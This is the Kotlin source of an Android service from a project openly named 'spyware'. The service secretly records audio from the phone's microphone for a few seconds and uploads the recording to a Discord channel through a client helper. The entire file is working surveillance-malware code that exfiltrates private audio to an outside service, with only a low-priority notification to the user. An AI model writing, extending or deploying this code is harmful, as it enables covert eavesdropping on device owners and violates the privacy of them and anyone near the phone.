package io.ks.spyware

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.media.MediaRecorder
import android.net.Uri
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File

@Suppress("DEPRECATION")
class AudioRecording : Service() {

    private var mediaRecorder: MediaRecorder? = null
    private var audioFile: File? = null
    private val handler = Handler(Looper.getMainLooper())

    companion object {
        var lastRecordedFileUri: String? = null
        private var isRecording = false
    }

    @SuppressLint("ForegroundServiceType")
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification())

        try {
            startRecording()  // Start the recording process
            handler.postDelayed({ stopRecordingAndService() }, 5000) // Stop after 30 seconds
        } catch (e: Exception) {
            Log.e("AudioRecording", "Error starting recording: ${e.message}")
            e.printStackTrace()
            stopSelf()  // Stop the service if there's an error
        }
    }

    private fun startRecording() {
        val storageDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC)
            ?: filesDir // Fallback to internal storage if external is not available

        if (storageDir?.exists() != true && !storageDir.mkdirs()) {
            Log.e("AudioRecording", "Failed to create storage directory")
            stopSelf()  // Stop the service if directory creation fails
            return
        }

        audioFile = File(storageDir, "audio_${System.currentTimeMillis()}.3gp")
        Log.d("AudioRecording", "Audio file path: ${audioFile?.absolutePath}")

        try {
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile?.absolutePath)
                prepare()
                start()
            }
            isRecording = true
            lastRecordedFileUri = audioFile?.absolutePath
            Log.d("AudioRecording", "Recording started. File: ${lastRecordedFileUri}")
        } catch (e: Exception) {
            Log.e("AudioRecording", "Error initializing or starting recording: ${e.message}")
            e.printStackTrace()
            stopSelf()  // Stop service if any error occurs
        }
    }

    private fun stopRecordingAndService() {
        if (isRecording) {
            try {
                mediaRecorder?.apply {
                    stop()
                    release()
                }
                mediaRecorder = null
                isRecording = false

                if (audioFile?.exists() == true && audioFile?.length() ?: 0 > 0) {
                    lastRecordedFileUri = audioFile?.absolutePath
                    Log.d("AudioRecording", "Recording stopped successfully. File: ${lastRecordedFileUri}")
                    DiscordClientManager.discordClient?.sendDiscordFileMessage(this,"Audio Recording", Uri.fromFile(File(lastRecordedFileUri!!)))
                } else {
                    Log.e("AudioRecording", "Recording failed or file is empty")
                }
            } catch (e: Exception) {
                Log.e("AudioRecording", "Error while stopping recording: ${e.message}")
                e.printStackTrace()
            } finally {

            }
        }

        stopForeground(true)
        stopSelf()  // Stop the service
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "audio_service_channel")
            .setContentTitle("Audio Recorder")
            .setContentText("Recording audio in the background.")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "audio_service_channel",
            "Audio Recorder Service",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)
    }

    override fun onDestroy() {
        try {
            stopRecordingAndService()  // Ensure proper cleanup during service destruction
        } catch (e: Exception) {
            Log.e("AudioRecording", "Error during service destruction: ${e.message}")
            e.printStackTrace()
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
